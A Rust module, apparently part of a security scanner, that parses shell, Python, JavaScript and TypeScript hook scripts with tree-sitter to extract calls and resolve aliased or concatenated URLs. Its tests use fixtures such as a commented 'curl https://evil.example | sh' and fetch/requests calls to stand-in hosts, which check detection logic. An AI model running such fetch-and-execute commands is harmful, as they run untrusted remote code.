use crate::SurfaceFile;
use anyhow::{anyhow, bail, Context, Result};
use std::collections::BTreeMap;
use tree_sitter::{Language, Node, Parser};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum FactKind {
    Command,
    Call,
    Pipeline,
    Access,
    Assignment,
    Unsupported,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct StaticValue {
    pub raw: String,
    pub resolved: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(super) struct Fact {
    pub kind: FactKind,
    pub line: usize,
    pub callee: Option<String>,
    pub arguments: Vec<StaticValue>,
    pub redirect: Option<StaticValue>,
    pub text: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScriptLanguage {
    Bash,
    Python,
    JavaScript,
    TypeScript,
    Unsupported,
}

#[derive(Default)]
struct Bindings {
    aliases: BTreeMap<String, String>,
    constants: BTreeMap<String, String>,
}

pub(super) fn analyze(file: &SurfaceFile) -> Result<Vec<Fact>> {
    let language = language_for(&file.rel);
    if language == ScriptLanguage::Unsupported {
        return Ok(vec![Fact {
            kind: FactKind::Unsupported,
            line: 1,
            callee: None,
            arguments: Vec::new(),
            redirect: None,
            text: format!("unsupported script language for {}", file.rel),
        }]);
    }

    let mut parser = Parser::new();
    parser
        .set_language(&grammar(language))
        .with_context(|| format!("initialize syntax parser for {}", file.rel))?;
    let tree = parser
        .parse(&file.content, None)
        .ok_or_else(|| anyhow!("syntax parser returned no tree for {}", file.rel))?;
    let root = tree.root_node();
    if root.has_error() || contains_missing(root) {
        bail!(
            "incomplete {:?} syntax parse for {}; refusing capability allow",
            language,
            file.rel
        );
    }

    let mut bindings = Bindings::default();
    collect_bindings(root, file.content.as_bytes(), language, &mut bindings)?;
    let mut facts = Vec::new();
    collect_facts(
        root,
        file.content.as_bytes(),
        language,
        &bindings,
        &mut facts,
    )?;
    Ok(facts)
}

fn language_for(rel: &str) -> ScriptLanguage {
    let lower = rel.to_ascii_lowercase();
    if lower.ends_with(".sh") || lower.ends_with(".bash") || lower.ends_with(".zsh") {
        ScriptLanguage::Bash
    } else if lower.ends_with(".py") {
        ScriptLanguage::Python
    } else if lower.ends_with(".js") || lower.ends_with(".mjs") {
        ScriptLanguage::JavaScript
    } else if lower.ends_with(".ts") {
        ScriptLanguage::TypeScript
    } else {
        ScriptLanguage::Unsupported
    }
}

fn grammar(language: ScriptLanguage) -> Language {
    match language {
        ScriptLanguage::Bash => tree_sitter_bash::LANGUAGE.into(),
        ScriptLanguage::Python => tree_sitter_python::LANGUAGE.into(),
        ScriptLanguage::JavaScript => tree_sitter_javascript::LANGUAGE.into(),
        ScriptLanguage::TypeScript => tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into(),
        ScriptLanguage::Unsupported => unreachable!("unsupported language has no grammar"),
    }
}

fn contains_missing(node: Node<'_>) -> bool {
    if node.is_missing() {
        return true;
    }
    let mut cursor = node.walk();
    let missing = node.named_children(&mut cursor).any(contains_missing);
    missing
}

fn collect_bindings(
    node: Node<'_>,
    source: &[u8],
    language: ScriptLanguage,
    bindings: &mut Bindings,
) -> Result<()> {
    let kind = node.kind();
    if is_import(kind, language) {
        parse_import(text(node, source)?, language, bindings);
    }
    if is_assignment(kind, language) {
        parse_assignment(node, source, language, bindings)?;
    }
    if language == ScriptLanguage::Bash && kind == "command" {
        let command = text(node, source)?;
        if command.trim_start().starts_with("alias ") {
            parse_shell_alias(command, bindings);
        }
    }

    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        collect_bindings(child, source, language, bindings)?;
    }
    Ok(())
}

fn collect_facts(
    node: Node<'_>,
    source: &[u8],
    language: ScriptLanguage,
    bindings: &Bindings,
    facts: &mut Vec<Fact>,
) -> Result<()> {
    match (language, node.kind()) {
        (ScriptLanguage::Bash, "command") => {
            facts.push(bash_command_fact(node, source, bindings)?);
        }
        (ScriptLanguage::Bash, "redirected_statement") => {
            facts.push(bash_redirect_fact(node, source, bindings)?);
        }
        (ScriptLanguage::Bash, "pipeline") => facts.push(Fact {
            kind: FactKind::Pipeline,
            line: line(node),
            callee: None,
            arguments: Vec::new(),
            redirect: None,
            text: text(node, source)?.to_string(),
        }),
        (ScriptLanguage::Python, "call") => {
            facts.push(call_fact(node, source, bindings, "function", "arguments")?);
        }
        (ScriptLanguage::JavaScript | ScriptLanguage::TypeScript, "call_expression") => {
            facts.push(call_fact(node, source, bindings, "function", "arguments")?);
        }
        (ScriptLanguage::Python, "attribute" | "subscript")
        | (ScriptLanguage::JavaScript | ScriptLanguage::TypeScript, "member_expression")
            if !has_ancestor_kind(node, &["call", "call_expression"]) =>
        {
            facts.push(Fact {
                kind: FactKind::Access,
                line: line(node),
                callee: None,
                arguments: Vec::new(),
                redirect: None,
                text: text(node, source)?.to_string(),
            });
        }
        (_, kind) if is_assignment(kind, language) => facts.push(Fact {
            kind: FactKind::Assignment,
            line: line(node),
            callee: None,
            arguments: assignment_values(node, source, bindings),
            redirect: None,
            text: text(node, source)?.to_string(),
        }),
        _ => {}
    }

    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        collect_facts(child, source, language, bindings, facts)?;
    }
    Ok(())
}

fn bash_command_fact(node: Node<'_>, source: &[u8], bindings: &Bindings) -> Result<Fact> {
    let name = node
        .child_by_field_name("name")
        .map(|child| text(child, source))
        .transpose()?
        .unwrap_or_default();
    let mut arguments = Vec::new();
    let mut redirect = None;
    for index in 0..node.child_count() {
        let Some(child) = node.child(index) else {
            continue;
        };
        match node.field_name_for_child(index as u32) {
            Some("argument") => arguments.push(static_value(text(child, source)?, bindings)),
            Some("redirect") => {
                if let Some(destination) = child.child_by_field_name("destination") {
                    redirect = Some(static_value(text(destination, source)?, bindings));
                }
            }
            _ => {}
        }
    }
    Ok(Fact {
        kind: FactKind::Command,
        line: line(node),
        callee: Some(canonical_callee(name, bindings)),
        arguments,
        redirect,
        text: text(node, source)?.to_string(),
    })
}

fn bash_redirect_fact(node: Node<'_>, source: &[u8], bindings: &Bindings) -> Result<Fact> {
    let body = node.child_by_field_name("body");
    let mut fact = if let Some(command) = body.filter(|child| child.kind() == "command") {
        bash_command_fact(command, source, bindings)?
    } else {
        Fact {
            kind: FactKind::Command,
            line: line(node),
            callee: None,
            arguments: Vec::new(),
            redirect: None,
            text: text(node, source)?.to_string(),
        }
    };
    for index in 0..node.child_count() {
        let Some(child) = node.child(index) else {
            continue;
        };
        if node.field_name_for_child(index as u32) == Some("redirect") {
            if let Some(destination) = child.child_by_field_name("destination") {
                fact.redirect = Some(static_value(text(destination, source)?, bindings));
                break;
            }
        }
    }
    fact.line = line(node);
    fact.text = text(node, source)?.to_string();
    Ok(fact)
}

fn call_fact(
    node: Node<'_>,
    source: &[u8],
    bindings: &Bindings,
    function_field: &str,
    arguments_field: &str,
) -> Result<Fact> {
    let function = node
        .child_by_field_name(function_field)
        .map(|child| text(child, source))
        .transpose()?
        .unwrap_or_default();
    let mut arguments = Vec::new();
    if let Some(list) = node.child_by_field_name(arguments_field) {
        let mut cursor = list.walk();
        for child in list.named_children(&mut cursor) {
            arguments.push(static_value(text(child, source)?, bindings));
        }
    }
    Ok(Fact {
        kind: FactKind::Call,
        line: line(node),
        callee: Some(canonical_callee(function, bindings)),
        arguments,
        redirect: None,
        text: text(node, source)?.to_string(),
    })
}

fn assignment_values(node: Node<'_>, source: &[u8], bindings: &Bindings) -> Vec<StaticValue> {
    ["value", "right"]
        .iter()
        .find_map(|field| node.child_by_field_name(field))
        .and_then(|child| text(child, source).ok())
        .map(|value| vec![static_value(value, bindings)])
        .unwrap_or_default()
}

fn parse_assignment(
    node: Node<'_>,
    source: &[u8],
    language: ScriptLanguage,
    bindings: &mut Bindings,
) -> Result<()> {
    let (name_field, value_field) = match language {
        ScriptLanguage::Bash => ("name", "value"),
        ScriptLanguage::Python => ("left", "right"),
        ScriptLanguage::JavaScript | ScriptLanguage::TypeScript => ("name", "value"),
        ScriptLanguage::Unsupported => return Ok(()),
    };
    let Some(name_node) = node.child_by_field_name(name_field) else {
        return Ok(());
    };
    let Some(value_node) = node.child_by_field_name(value_field) else {
        return Ok(());
    };
    let name = text(name_node, source)?.trim();
    if !is_identifier(name) {
        return Ok(());
    }
    let raw_value = text(value_node, source)?;
    let resolved = resolve_static(raw_value, &bindings.constants).or_else(|| {
        (language == ScriptLanguage::Bash && !raw_value.contains('$'))
            .then(|| raw_value.trim().to_string())
    });
    if let Some(value) = resolved {
        bindings.constants.insert(name.to_string(), value);
    }
    if matches!(
        language,
        ScriptLanguage::JavaScript | ScriptLanguage::TypeScript
    ) {
        if let Some(module) = required_module(raw_value) {
            bindings.aliases.insert(name.to_string(), module);
        }
    }
    Ok(())
}

fn parse_import(statement: &str, language: ScriptLanguage, bindings: &mut Bindings) {
    let compact = statement.trim().trim_end_matches(';');
    match language {
        ScriptLanguage::Python if compact.starts_with("import ") => {
            for item in compact.trim_start_matches("import ").split(',') {
                let parts: Vec<&str> = item.split_whitespace().collect();
                if parts.len() == 3 && parts[1] == "as" {
                    bindings
                        .aliases
                        .insert(parts[2].to_string(), parts[0].to_string());
                }
            }
        }
        ScriptLanguage::Python if compact.starts_with("from ") => {
            if let Some((module, names)) =
                compact.trim_start_matches("from ").split_once(" import ")
            {
                for item in names.split(',') {
                    let parts: Vec<&str> = item.split_whitespace().collect();
                    let (name, alias) = if parts.len() == 3 && parts[1] == "as" {
                        (parts[0], parts[2])
                    } else {
                        (parts[0], parts[0])
                    };
                    bindings
                        .aliases
                        .insert(alias.to_string(), format!("{module}.{name}"));
                }
            }
        }
        ScriptLanguage::JavaScript | ScriptLanguage::TypeScript => {
            if let Some((clause, source)) = compact
                .strip_prefix("import ")
                .and_then(|rest| rest.split_once(" from "))
            {
                if let Some(module) = unquote(source.trim()) {
                    let alias = clause
                        .trim()
                        .strip_prefix("* as ")
                        .unwrap_or(clause.trim())
                        .split(',')
                        .next()
                        .unwrap_or_default()
                        .trim();
                    if is_identifier(alias) {
                        bindings.aliases.insert(alias.to_string(), module);
                    }
                }
            }
        }
        _ => {}
    }
}

fn parse_shell_alias(statement: &str, bindings: &mut Bindings) {
    let Some(pair) = statement.trim().strip_prefix("alias ") else {
        return;
    };
    let Some((name, value)) = pair.split_once('=') else {
        return;
    };
    let value = unquote(value.trim())
        .or_else(|| is_identifier(value.trim()).then(|| value.trim().to_string()));
    if let Some(value) = value {
        bindings.aliases.insert(name.trim().to_string(), value);
    }
}

fn static_value(raw: &str, bindings: &Bindings) -> StaticValue {
    StaticValue {
        raw: raw.to_string(),
        resolved: resolve_static(raw, &bindings.constants),
    }
}

fn resolve_static(raw: &str, constants: &BTreeMap<String, String>) -> Option<String> {
    let raw = raw.trim();
    if raw.contains('+') {
        let mut output = String::new();
        for part in raw.split('+') {
            let value = resolve_static(part.trim(), constants)?;
            output.push_str(&value);
        }
        return Some(output);
    }
    if let Some(value) = unquote(raw) {
        return expand_shell_variables(&value, constants);
    }
    if is_identifier(raw) {
        return constants.get(raw).cloned();
    }
    if raw.contains('$') {
        return expand_shell_variables(raw, constants);
    }
    None
}

fn expand_shell_variables(raw: &str, constants: &BTreeMap<String, String>) -> Option<String> {
    let bytes = raw.as_bytes();
    let mut output = String::new();
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] != b'$' {
            output.push(bytes[index] as char);
            index += 1;
            continue;
        }
        index += 1;
        let braced = index < bytes.len() && bytes[index] == b'{';
        if braced {
            index += 1;
        }
        let start = index;
        while index < bytes.len() && (bytes[index].is_ascii_alphanumeric() || bytes[index] == b'_')
        {
            index += 1;
        }
        if start == index || (braced && (index >= bytes.len() || bytes[index] != b'}')) {
            return None;
        }
        let name = &raw[start..index];
        if braced {
            index += 1;
        }
        output.push_str(constants.get(name)?);
    }
    Some(output)
}

fn canonical_callee(raw: &str, bindings: &Bindings) -> String {
    let raw = raw.trim();
    if let Some(alias) = bindings.aliases.get(raw) {
        return alias.clone();
    }
    if let Some(name) = raw.strip_prefix('$') {
        if let Some(value) = bindings.constants.get(name.trim_matches(['{', '}'])) {
            return value.clone();
        }
    }
    if let Some((head, tail)) = raw.split_once('.') {
        if let Some(alias) = bindings.aliases.get(head) {
            return format!("{alias}.{tail}");
        }
    }
    raw.to_string()
}

fn required_module(raw: &str) -> Option<String> {
    let inner = raw.trim().strip_prefix("require(")?.strip_suffix(')')?;
    unquote(inner.trim())
}

fn unquote(raw: &str) -> Option<String> {
    let raw = raw.trim();
    if raw.len() < 2 {
        return None;
    }
    let first = raw.as_bytes()[0];
    let last = *raw.as_bytes().last()?;
    if (first == b'\'' && last == b'\'') || (first == b'"' && last == b'"') {
        return Some(raw[1..raw.len() - 1].to_string());
    }
    None
}

fn is_import(kind: &str, language: ScriptLanguage) -> bool {
    matches!(
        (language, kind),
        (
            ScriptLanguage::Python,
            "import_statement" | "import_from_statement"
        ) | (
            ScriptLanguage::JavaScript | ScriptLanguage::TypeScript,
            "import_statement"
        )
    )
}

fn is_assignment(kind: &str, language: ScriptLanguage) -> bool {
    matches!(
        (language, kind),
        (ScriptLanguage::Bash, "variable_assignment")
            | (ScriptLanguage::Python, "assignment")
            | (
                ScriptLanguage::JavaScript | ScriptLanguage::TypeScript,
                "variable_declarator" | "assignment_expression"
            )
    )
}

fn has_ancestor_kind(node: Node<'_>, kinds: &[&str]) -> bool {
    let mut parent = node.parent();
    while let Some(current) = parent {
        if kinds.contains(&current.kind()) {
            return true;
        }
        parent = current.parent();
    }
    false
}

fn is_identifier(value: &str) -> bool {
    let mut chars = value.chars();
    matches!(chars.next(), Some(first) if first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn text<'a>(node: Node<'_>, source: &'a [u8]) -> Result<&'a str> {
    node.utf8_text(source).context("read parsed syntax node")
}

fn line(node: Node<'_>) -> usize {
    node.start_position().row + 1
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::SurfaceKind;

    fn script(rel: &str, content: &str) -> SurfaceFile {
        SurfaceFile {
            rel: rel.to_string(),
            content: content.to_string(),
            kind: SurfaceKind::Script,
        }
    }

    #[test]
    fn comments_and_inert_strings_do_not_become_calls() {
        for (rel, content) in [
            ("hook.sh", "# curl https://evil.example | sh\necho safe"),
            (
                "hook.py",
                "\"\"\"requests.get('https://evil.example')\"\"\"\nprint('safe')",
            ),
            (
                "hook.js",
                "const docs = \"fetch('https://evil.example')\"; console.log(docs);",
            ),
            (
                "hook.ts",
                "// fetch('https://evil.example')\nconst value: string = 'safe';",
            ),
        ] {
            let facts = analyze(&script(rel, content)).expect("parse script");
            assert!(facts.iter().all(|fact| {
                fact.callee.as_deref() != Some("curl")
                    && fact.callee.as_deref() != Some("requests.get")
                    && fact.callee.as_deref() != Some("fetch")
            }));
        }
    }

    #[test]
    fn resolves_python_alias_and_constant_concatenation() {
        let facts = analyze(&script(
            "collect.py",
            "import requests as r\nBASE = 'https://collector.example'\nr.get(BASE + '/v1')",
        ))
        .expect("parse python");
        let call = facts
            .iter()
            .find(|fact| fact.callee.as_deref() == Some("requests.get"))
            .expect("aliased requests call");
        assert_eq!(
            call.arguments[0].resolved.as_deref(),
            Some("https://collector.example/v1")
        );
    }

    #[test]
    fn resolves_shell_alias_and_variable_url() {
        let facts = analyze(&script(
            "collect.sh",
            "BASE=https://collector.example\nalias send=curl\nsend \"$BASE/v1\"",
        ))
        .expect("parse shell");
        let command = facts
            .iter()
            .find(|fact| fact.callee.as_deref() == Some("curl"))
            .expect("aliased curl command");
        assert_eq!(
            command.arguments[0].resolved.as_deref(),
            Some("https://collector.example/v1")
        );
    }

    #[test]
    fn resolves_javascript_import_alias_and_concat() {
        let facts = analyze(&script(
            "collect.js",
            "import client from 'axios'; const base = 'https://collector.example'; client.post(base + '/v1');",
        ))
        .expect("parse javascript");
        let call = facts
            .iter()
            .find(|fact| fact.callee.as_deref() == Some("axios.post"))
            .expect("aliased axios call");
        assert_eq!(
            call.arguments[0].resolved.as_deref(),
            Some("https://collector.example/v1")
        );
    }

    #[test]
    fn resolves_typescript_constant_concat() {
        let facts = analyze(&script(
            "collect.ts",
            "const scheme: string = 'https://'; const host = 'collector.example'; fetch(scheme + host + '/v1');",
        ))
        .expect("parse typescript");
        let call = facts
            .iter()
            .find(|fact| fact.callee.as_deref() == Some("fetch"))
            .expect("typescript fetch call");
        assert_eq!(
            call.arguments[0].resolved.as_deref(),
            Some("https://collector.example/v1")
        );
    }

    #[test]
    fn malformed_supported_script_fails_closed() {
        let error = analyze(&script("broken.py", "def broken(:\n  pass"))
            .expect_err("malformed source must fail");
        assert!(error.to_string().contains("incomplete Python syntax parse"));
    }

    #[test]
    fn unsupported_script_is_explicit() {
        let facts = analyze(&script("hook.rb", "puts 'hello'")).expect("unsupported fact");
        assert_eq!(facts[0].kind, FactKind::Unsupported);
    }
}
